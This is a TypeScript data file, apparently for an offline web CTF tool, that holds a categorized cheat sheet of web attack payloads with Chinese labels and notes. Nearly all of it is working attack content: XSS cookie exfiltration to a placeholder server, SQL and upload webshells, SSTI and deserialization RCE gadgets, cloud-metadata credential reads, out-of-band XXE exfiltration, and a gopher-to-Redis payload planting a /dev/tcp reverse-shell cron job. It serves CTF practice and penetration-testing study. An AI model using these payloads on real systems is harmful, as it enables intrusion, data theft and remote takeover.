/** Web CTF payload cheat sheet (offline). Curated from public cheat sheets
 *  (PayloadsAllTheThings, pentestmonkey, PortSwigger labs, OWASP). */

export type PayloadCat =
  | "XSS"
  | "SQLi"
  | "命令注入"
  | "SSTI"
  | "LFI"
  | "文件上传"
  | "SSRF"
  | "XXE"
  | "请求头"
  | "反序列化";

export const PAYLOAD_CATS: PayloadCat[] = [
  "XSS", "SQLi", "命令注入", "SSTI", "LFI", "文件上传", "SSRF", "XXE", "请求头", "反序列化",
];

export interface Payload {
  cat: PayloadCat;
  name: string;
  code: string;
  note?: string;
}

export const PAYLOADS: Payload[] = [
  // ---------------- XSS ----------------
  { cat: "XSS", name: "基础 <script>", code: "<script>alert(1)</script>" },
  { cat: "XSS", name: "img onerror", code: '<img src=x onerror=alert(1)>' },
  { cat: "XSS", name: "svg onload", code: "<svg onload=alert(1)>" },
  { cat: "XSS", name: "body onload", code: "<body onload=alert(1)>" },
  { cat: "XSS", name: "iframe javascript:", code: '<iframe src="javascript:alert(1)"></iframe>' },
  { cat: "XSS", name: "input autofocus", code: "<input onfocus=alert(1) autofocus>" },
  { cat: "XSS", name: "details ontoggle", code: "<details open ontoggle=alert(1)>" },
  { cat: "XSS", name: "select onchange", code: "<select onchange=alert(1)><option>a</option><option>b</option></select>" },
  { cat: "XSS", name: "video source onerror", code: '<video><source onerror="javascript:alert(1)">' },
  { cat: "XSS", name: "audio onerror", code: "<audio src=x onerror=alert(1)>" },
  { cat: "XSS", name: "marquee onstart", code: "<marquee onstart=alert(1)>XSS</marquee>" },
  { cat: "XSS", name: "a href", code: '<a href="javascript:alert(1)">点我</a>' },
  { cat: "XSS", name: "onmouseover", code: '<div onmouseover="alert(1)">鼠标移过来</div>' },
  { cat: "XSS", name: "svg animate", code: "<svg><animate onbegin=alert(1) attributeName=x dur=1s>" },
  { cat: "XSS", name: "大小写绕过", code: "<ScRiPt>alert(1)</sCrIpT>", note: "绕过只匹配小写的黑名单" },
  { cat: "XSS", name: "双写绕过", code: "<scr<script>ipt>alert(1)</scr</script>ipt>", note: "过滤一次<script>时用" },
  { cat: "XSS", name: "HTML实体编码绕过", code: '<img src=x onerror="&#97;lert(1)">', note: "alert 首字母 a 编码为 &#97;" },
  { cat: "XSS", name: "无括号 (反引号)", code: "<script>alert`1`</script>", note: "模板字符串代替 ()" },
  { cat: "XSS", name: "无括号 (throw)", code: "<script>onerror=alert;throw 1</script>", note: "利用 throw 触发 onerror" },
  { cat: "XSS", name: "斜杠/换行分隔属性", code: "<svg/onload=alert(1)> / <svg%0aonload=alert(1)>", note: "绕过空格过滤" },
  { cat: "XSS", name: "mXSS mglyph", code: "<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>", note: "破坏 HTML 解析树,常见于富文本过滤" },
  { cat: "XSS", name: "Polyglot 大杂烩", code: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e', note: "一次测试 上下文/属性/注释 等多种场景" },
  { cat: "XSS", name: "Cookie 外带", code: "<script>fetch('http://YOUR-SERVER/?c='+document.cookie)</script>", note: "把 YOUR-SERVER 换成你的接收地址;无外网时用本机 IP" },
  { cat: "XSS", name: "远程加载 JS", code: "<script src=http://YOUR-SERVER/x.js></script>" },
  { cat: "XSS", name: "Markdown 图片", code: '![x](x"onerror=alert(1))', note: "评论/MD 渲染场景" },
  { cat: "XSS", name: "Markdown 链接", code: "[x](javascript:alert(1))" },
  { cat: "XSS", name: "DOM XSS (hash)", code: "http://target/#<img src=x onerror=alert(1)>", note: "前端把 location.hash 写进 innerHTML 时" },
  { cat: "XSS", name: "storage 型探测", code: "<script>alert(navigator.userAgent)</script>", note: "改 alert 内容确认回显位置" },

  // ---------------- SQLi ----------------
  { cat: "SQLi", name: "认证绕过", code: "' OR 1=1-- -", note: "登录框用户名" },
  { cat: "SQLi", name: "认证绕过 (admin)", code: "admin'-- -" },
  { cat: "SQLi", name: "认证绕过 (老系统)", code: "' or ''='" },
  { cat: "SQLi", name: "ORDER BY 探列数", code: "' ORDER BY 1-- -", note: "递增数字,报错即上限" },
  { cat: "SQLi", name: "UNION 探列数", code: "' UNION SELECT NULL,NULL,NULL-- -", note: "NULL 个数 = 列数" },
  { cat: "SQLi", name: "MySQL 信息", code: "' UNION SELECT version(),user(),database()-- -" },
  { cat: "SQLi", name: "PostgreSQL 信息", code: "' UNION SELECT version(),current_user,current_database()-- -" },
  { cat: "SQLi", name: "MSSQL 信息", code: "' UNION SELECT @@version,SUSER_SNAME(),DB_NAME()-- -" },
  { cat: "SQLi", name: "SQLite 信息", code: "' UNION SELECT sqlite_version(),NULL,NULL-- -" },
  { cat: "SQLi", name: "枚举所有表", code: "' UNION SELECT table_schema,table_name,NULL FROM information_schema.tables-- -" },
  { cat: "SQLi", name: "枚举列", code: "' UNION SELECT column_name,data_type,NULL FROM information_schema.columns WHERE table_name='users'-- -" },
  { cat: "SQLi", name: "报错注入 updatexml", code: "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)-- -", note: "MySQL ≥5.1" },
  { cat: "SQLi", name: "报错注入 extractvalue", code: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -" },
  { cat: "SQLi", name: "布尔盲注", code: "' AND (SELECT SUBSTR(password,1,1) FROM users LIMIT 1)='a'-- -", note: "逐字符二分/爆破" },
  { cat: "SQLi", name: "时间盲注 MySQL", code: "' AND SLEEP(5)-- -" },
  { cat: "SQLi", name: "时间盲注 PostgreSQL", code: "'; SELECT pg_sleep(5)-- -" },
  { cat: "SQLi", name: "时间盲注 MSSQL", code: "'; WAITFOR DELAY '0:0:5'-- -" },
  { cat: "SQLi", name: "读文件 (MySQL)", code: "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- -", note: "需 secure_file_priv 允许" },
  { cat: "SQLi", name: "写 WebShell (MySQL)", code: "' UNION SELECT '<?php system($_GET[0]);?>' INTO OUTFILE '/var/www/html/s.php'-- -", note: "需 FILE 权限 + 可写目录" },
  { cat: "SQLi", name: "注释代替空格", code: "UNION/**/SELECT/**/1,2,3-- -", note: "空格被过滤时" },
  { cat: "SQLi", name: "MySQL 内联注释", code: "/*!50000union*//*!50000select*/1,2,3-- -", note: "版本号 ≥5.0 才执行" },
  { cat: "SQLi", name: "堆叠查询", code: "'; INSERT INTO users VALUES('h','h')-- -", note: "mysqli/PDO 多语句" },
  { cat: "SQLi", name: "NoSQL 认证绕过", code: "admin' || '1'=='1", note: "Mongo 密码框" },
  { cat: "SQLi", name: "NoSQL JSON 注入", code: '{"username":{"$ne":""},"password":{"$ne":""}}', note: "JSON body 整体替换" },
  { cat: "SQLi", name: "NoSQL $regex 爆破", code: "username[$regex]=^a&password[$ne]=1", note: "URL 参数形式逐位爆破" },
  { cat: "SQLi", name: "大小写绕过 WAF", code: "UnIoN SeLeCt 1,2,3-- -" },
  { cat: "SQLi", name: "Hex 绕过字符串过滤", code: "SELECT 0x616263", note: "0x616263 = 'abc'" },

  // ---------------- 命令注入 ----------------
  { cat: "命令注入", name: "分号", code: "; id" },
  { cat: "命令注入", name: "管道", code: "| id" },
  { cat: "命令注入", name: "AND", code: "&& id" },
  { cat: "命令注入", name: "OR (盲用)", code: "|| id" },
  { cat: "命令注入", name: "换行符", code: "%0aid" },
  { cat: "命令注入", name: "反引号执行", code: "`id`" },
  { cat: "命令注入", name: "$() 执行", code: "$(id)" },
  { cat: "命令注入", name: "空格绕过 ${IFS}", code: "cat${IFS}/etc/passwd" },
  { cat: "命令注入", name: "空格绕过 $IFS$9", code: "cat$IFS$9/etc/passwd", note: "$9 是空参数" },
  { cat: "命令注入", name: "重定向代替空格", code: "cat</etc/passwd" },
  { cat: "命令注入", name: "引号拆分关键字", code: "c''at /etc/passwd", note: "同类: c\\at / \"c\"a\"t\"" },
  { cat: "命令注入", name: "Base64 绕过", code: "echo aWQ=|base64 -d|sh", note: "aWQ= = 'id'" },
  { cat: "命令注入", name: "$'' 十六进制", code: "$'\\x69\\x64'", note: "bash ANSI-C quoting,= id" },
  { cat: "命令注入", name: "Windows & ", code: "& whoami" },
  { cat: "命令注入", name: "Windows &&", code: "&& whoami" },
  { cat: "命令注入", name: "OOB DNS 外带", code: "`nslookup $(whoami).xxxx.oastify.com`", note: "盲注验证/外带数据,无外网可指向本机 dnslog" },
  { cat: "命令注入", name: "时间盲注", code: "; sleep 5", note: "或 ping -c 3 127.0.0.1 观察延迟" },
  { cat: "命令注入", name: "通配符绕过", code: "/???/??t /???/p?ss??", note: "= cat /etc/passwd 的 glob 形式" },

  // ---------------- SSTI ----------------
  { cat: "SSTI", name: "探测 ${}", code: "${7*7}" },
  { cat: "SSTI", name: "探测 {{}}", code: "{{7*7}}" },
  { cat: "SSTI", name: "探测 ERB", code: "<%= 7*7 %>" },
  { cat: "SSTI", name: "探测 Ruby #{}", code: "#{7*7}" },
  { cat: "SSTI", name: "指纹识别", code: "{{7*'7'}}", note: "Jinja2→7777777,Twig→49,ERB→报错" },
  { cat: "SSTI", name: "Jinja2 RCE (cycler)", code: "{{ cycler.__init__.__globals__.os.popen('id').read() }}" },
  { cat: "SSTI", name: "Jinja2 RCE (lipsum)", code: "{{ lipsum.__globals__['os'].popen('cat /flag').read() }}" },
  { cat: "SSTI", name: "Jinja2 读配置", code: "{{ config }}", note: "查 SECRET_KEY: {{ config.SECRET_KEY }}" },
  { cat: "SSTI", name: "Jinja2 subclasses", code: "{{ ''.__class__.__mro__[1].__subclasses__() }}", note: "在输出里找 Popen / os._wrap_close 等" },
  { cat: "SSTI", name: "Jinja2 下划线绕过", code: "{{ ()|attr(request.args.a) }}&a=__class__", note: "attr 过滤器 + 参数外置绕过 _ 过滤" },
  { cat: "SSTI", name: "Twig filter RCE", code: "{{ ['id']|filter('system') }}" },
  { cat: "SSTI", name: "Twig 老版本 RCE", code: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}" },
  { cat: "SSTI", name: "Freemarker RCE", code: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}' },
  { cat: "SSTI", name: "Velocity RCE", code: '#set($x="")##$x.class.forName("java.lang.Runtime").getRuntime().exec("id")' },
  { cat: "SSTI", name: "ERB (Ruby) RCE", code: "<%= system('id') %>", note: "或 <%= `id` %>" },
  { cat: "SSTI", name: "Mako RCE", code: "${__import__('os').popen('id').read()}" },
  { cat: "SSTI", name: "Tornado RCE", code: "{% import os %}{{ os.popen('id').read() }}" },
  { cat: "SSTI", name: "Smarty RCE", code: "{if system('id')}{/if}" },
  { cat: "SSTI", name: "Thymeleaf RCE", code: "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x", note: "Spring + Thymeleaf 片段表达式" },

  // ---------------- LFI ----------------
  { cat: "LFI", name: "基础路径穿越", code: "../../../../../../etc/passwd" },
  { cat: "LFI", name: "URL 编码穿越", code: "..%2f..%2f..%2fetc%2fpasswd" },
  { cat: "LFI", name: "双重编码", code: "%2e%2e%252f%2e%2e%252fetc%252fpasswd", note: "服务端二次解码时用" },
  { cat: "LFI", name: "过滤绕过 (....//)", code: "....//....//....//etc/passwd", note: "过滤一次 ../ 后残留 ../" },
  { cat: "LFI", name: "Tomcat ..;/", code: "..;/..;/etc/passwd" },
  { cat: "LFI", name: "空字节截断", code: "../../../etc/passwd%00.png", note: "仅 PHP < 5.3.4" },
  { cat: "LFI", name: "php://filter 读源码", code: "php://filter/convert.base64-encode/resource=index.php", note: "回显 base64,解码即源码" },
  { cat: "LFI", name: "php filter 链 RCE", code: "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|...|resource=php://temp", note: "CVE-2024-2961 (glibc iconv),完整链参考 gynvael/coldwind 的 POC 生成器" },
  { cat: "LFI", name: "data:// RCE", code: "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+", note: "需 allow_url_include=On" },
  { cat: "LFI", name: "expect:// RCE", code: "expect://id", note: "需 php expect 扩展" },
  { cat: "LFI", name: "日志包含", code: "/var/log/apache2/access.log", note: "先在 UA 写入 <?php system($_GET[0]);?> 再包含;Nginx: /var/log/nginx/access.log" },
  { cat: "LFI", name: "Session 包含", code: "/var/lib/php/sessions/sess_PHPSESSID值" },
  { cat: "LFI", name: "/proc/self/environ", code: "/proc/self/environ", note: "UA 注入 php 代码后包含" },
  { cat: "LFI", name: "Windows 路径", code: "..\\..\\..\\..\\windows\\win.ini" },
  { cat: "LFI", name: "phar:// 反序列化", code: "phar:///uploads/avatar.gif/test.txt", note: "phar 元数据触发反序列化,见反序列化页" },
  { cat: "LFI", name: "zip:// 读包内文件", code: "zip:///tmp/upload.zip%23shell.php" },

  // ---------------- 文件上传 ----------------
  { cat: "文件上传", name: "备用后缀", code: "shell.php5 / shell.phtml / shell.phar / shell.phps / shell.pgif / shell.shtml", note: "Apache 按模块解析这些后缀" },
  { cat: "文件上传", name: "大小写绕过", code: "shell.PhP / shell.pHp5" },
  { cat: "文件上传", name: "双后缀", code: "shell.php.jpg / shell.jpg.php / shell.php.123", note: "shell.php.123 为 Nginx 解析漏洞形" },
  { cat: "文件上传", name: "空字节截断", code: "shell.php%00.jpg", note: "仅老版本 PHP" },
  { cat: "文件上传", name: ".htaccess 覆盖", code: "AddType application/x-httpd-php .png", note: "上传为 .htaccess 后,任意 .png 按 PHP 执行" },
  { cat: "文件上传", name: ".user.ini 覆盖", code: "auto_prepend_file=shell.png", note: "上传 .user.ini + shell.png 到同目录,访问任意 php 触发" },
  { cat: "文件上传", name: "GIF 头伪装", code: "GIF89a<?php system($_GET[0]);?>", note: "保存为 shell.gif,绕过文件头检查" },
  { cat: "文件上传", name: "PNG 头 + 代码", code: "\\x89PNG\\r\\n\\x1a\\n + <?php system($_GET[0]);?>", note: "文件头写 PNG 魔数,代码跟在 IHDR 之后" },
  { cat: "文件上传", name: "竞态条件", code: "<?php file_put_contents('c.php','<?php system($_GET[0]);?>');?>" , note: "上传后立即爆破访问;被删前落地 c.php" },
  { cat: "文件上传", name: "Content-Type 伪造", code: "Content-Type: image/png", note: "改包时把 MIME 改为图片" },
  { cat: "文件上传", name: "web.config (IIS)", code: '<?xml version="1.0"?><configuration><system.webServer><handlers><add name="x" path="*.png" verb="*" modules="IsapiModule" scriptProcessor="%windir%\\system32\\inetsrv\\asp.dll" resourceType="File" requireAccess="Script"/></handlers></system.webServer></configuration>', note: "目录可写 + IIS 时让 png 按 asp 执行" },

  // ---------------- SSRF ----------------
  { cat: "SSRF", name: "基础 localhost", code: "http://127.0.0.1/" },
  { cat: "SSRF", name: "变体 localhost", code: "http://localhost / http://[::1] / http://0.0.0.0" },
  { cat: "SSRF", name: "整数 IP", code: "http://2130706433/", note: "127.0.0.1 的十进制" },
  { cat: "SSRF", name: "十六进制 IP", code: "http://0x7f000001/" },
  { cat: "SSRF", name: "八进制 IP", code: "http://0177.0.0.1/" },
  { cat: "SSRF", name: "缩写 IP", code: "http://127.1 / http://0/ / http://127.0.1" },
  { cat: "SSRF", name: "DNS 指向内网", code: "http://localtest.me/", note: "解析为 127.0.0.1 的公共域名;自建域名 A 记录指内网更稳" },
  { cat: "SSRF", name: "重定向绕过", code: "http://your-vps/redirect?url=http://127.0.0.1:6379/", note: "VPS 返回 302 到内网" },
  { cat: "SSRF", name: "@ 认证绕过", code: "http://expected.com@127.0.0.1/", note: "校验前缀但实际请求 @ 后的地址" },
  { cat: "SSRF", name: "AWS 元数据", code: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", note: "IMDSv1 直接读临时凭证;IMDSv2 需先 PUT token" },
  { cat: "SSRF", name: "GCP 元数据", code: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", note: "需头 Metadata-Flavor: Google" },
  { cat: "SSRF", name: "阿里云元数据", code: "http://100.100.100.200/latest/meta-data/" },
  { cat: "SSRF", name: "gopher:// 打 Redis", code: "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a\\n\\n*/1 * * * * bash -i >& /dev/tcp/x/x 0>&1\\n\\n%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a", note: "写 crontab 反弹;建议用 gopherus 工具生成" },
  { cat: "SSRF", name: "file:// 读文件", code: "file:///etc/passwd" },
  { cat: "SSRF", name: "dict:// 探端口", code: "dict://127.0.0.1:6379/INFO" },

  // ---------------- XXE ----------------
  { cat: "XXE", name: "基础读文件", code: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>' },
  { cat: "XXE", name: "Blind OOB", code: '<!ENTITY %% remote SYSTEM "http://YOUR-VPS/evil.dtd">%%remote;', note: "参数实体需在内部 DTD 中嵌套使用;放在 <!DOCTYPE r [ ... ]> 内" },
  { cat: "XXE", name: "evil.dtd 内容", code: '<!ENTITY %% file SYSTEM "file:///etc/passwd"><!ENTITY %% eval "<!ENTITY &#x25; exfil SYSTEM \'http://YOUR-VPS/?x=%%file;\'>">%%eval;%%exfil;' },
  { cat: "XXE", name: "expect RCE", code: '<!ENTITY xxe SYSTEM "expect://id">', note: "PHP expect 扩展" },
  { cat: "XXE", name: "SVG 载体", code: '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text x="1" y="10">&xxe;</text></svg>', note: "头像/图片上传点解析 SVG 时" },
  { cat: "XXE", name: "报错回显", code: '<!ENTITY xxe SYSTEM "file:/// nonexistent">' },

  // ---------------- 请求头 ----------------
  { cat: "请求头", name: "X-Forwarded-For", code: "X-Forwarded-For: 127.0.0.1", note: "伪造来源为内网/本机" },
  { cat: "请求头", name: "X-Original-URL", code: "X-Original-URL: /admin", note: "绕过前端路由校验 (配合 /xxx?X-Original-URL=/admin)" },
  { cat: "请求头", name: "X-Rewrite-URL", code: "X-Rewrite-URL: /admin" },
  { cat: "请求头", name: "X-Custom-IP-Authorization", code: "X-Custom-IP-Authorization: 127.0.0.1" },
  { cat: "请求头", name: "X-Host", code: "X-Host: attacker.com", note: "密码重置投毒 (邮件链接域名)" },
  { cat: "请求头", name: "Method 覆写", code: "X-HTTP-Method-Override: PUT" },
  { cat: "请求头", name: "CORS 反射测试", code: "Origin: https://evil.com", note: "观察 ACAO 是否反射任意 Origin + credentials" },
  { cat: "请求头", name: "UA 伪装", code: "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...", note: "绕过封禁 sqlmap/curl UA" },

  // ---------------- 反序列化 ----------------
  { cat: "反序列化", name: "PHP 结构探测", code: 'O:8:"stdClass":0:{}', note: "先确认 unserialize 入口,再构造 POP 链" },
  { cat: "反序列化", name: "PHP POP 骨架", code: 'O:4:"Test":1:{s:3:"cmd";s:2:"id";}', note: "Test 类存在 __destruct/__wakeup 调 system($this->cmd) 时触发" },
  { cat: "反序列化", name: "phar:// 触发", code: "phar:///uploads/x.gif/x.txt", note: "phar 元数据自动反序列化,file_exists 等函数可触发" },
  { cat: "反序列化", name: "Python pickle", code: "import pickle, base64, os\nclass RCE(object):\n    def __reduce__(self):\n        return (os.system, ('id',))\nprint(base64.b64encode(pickle.dumps(RCE())))", note: "输出 base64 塞进 cookie/body" },
  { cat: "反序列化", name: "Java 特征", code: "ACED0005 (hex头) / rO0AB (base64头)", note: "ysoserial 生成: java -jar ysoserial.jar CommonsCollections6 'id' > out.bin" },
  { cat: "反序列化", name: "Node serialize", code: '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}', note: "node-serialize 库" },
  { cat: "反序列化", name: "Ruby Marshal", code: "\\x04\\x08 (hex头)", note: "erb 模板注入或自定义 gadget 链" },
];
